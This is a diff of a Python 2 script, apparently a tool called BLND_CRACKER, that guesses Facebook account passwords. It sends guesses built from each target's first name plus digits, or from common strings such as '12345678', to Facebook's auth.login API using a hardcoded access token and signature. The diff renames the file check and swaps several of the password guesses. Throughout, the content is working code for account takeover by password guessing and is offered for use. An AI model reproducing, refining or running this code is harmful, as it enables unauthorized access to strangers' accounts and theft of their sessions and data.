@@ -16,11 +16,11 @@ fd = hd
 
 print fd.name
 os.system('clear')
-if 'BLND_CRACKER.py' == fd.name:
-    if 'BLND_CRACKER.py' == fd.name:
+if 'major.py' == fd.name:
+    if 'major.py' == fd.name:
         print 'GOOD'
     else:
-        print 'change name of file to my name BLND.py'
+        print 'change name of file to my name BLND_CRACKER.py'
         os.sys.exit()
 print ' '
 os.system('clear')
@@ -317,7 +317,7 @@ def startgrab():
                 cek.close()
                 cekpoint.append(user + pass1)
             else:
-                pass2 = b['first_name'] + '123'
+                pass2 = b['first_name'] + '123456'
                 data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                 q = json.load(data)
                 if 'access_token' in q:
@@ -422,7 +422,7 @@ def startgrab():
                                     cek.close()
                                     cekpoint.append(user + pass6)
                                 else:
-                                    pass7 = b['first_name'] + '1122'
+                                    pass7 = '12345678'
                                     data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                     q = json.load(data)
                                     if 'access_token' in q:
@@ -464,7 +464,7 @@ def startgrab():
                                             cek.close()
                                             cekpoint.append(user + pass8)
                                         else:
-                                            pass9 = b['first_name'] + '123456'
+                                            pass9 = b['first_name'] + '123'
                                             data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass9 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                             q = json.load(data)
                                             if 'access_token' in q:
@@ -506,7 +506,7 @@ def startgrab():
                                                       cek.close()
                                                       cekpoint.append(user + pass10)
                                                   else:
-                                                       pass11 = b['first_name'] + '12344321'
+                                                       pass11 ='12344321'
                                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass11 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                        q = json.load(data)
                                                        if 'access_token' in q:
@@ -527,7 +527,7 @@ def startgrab():
                                                            cek.close()
                                                            cekpoint.append(user + pass11)
                                                        else:
-                                                           pass12 = b['first_name'] + '123456789'
+                                                           pass12 ='123456789'
                                                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass12 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                            q = json.load(data)
                                                            if 'access_token' in q:
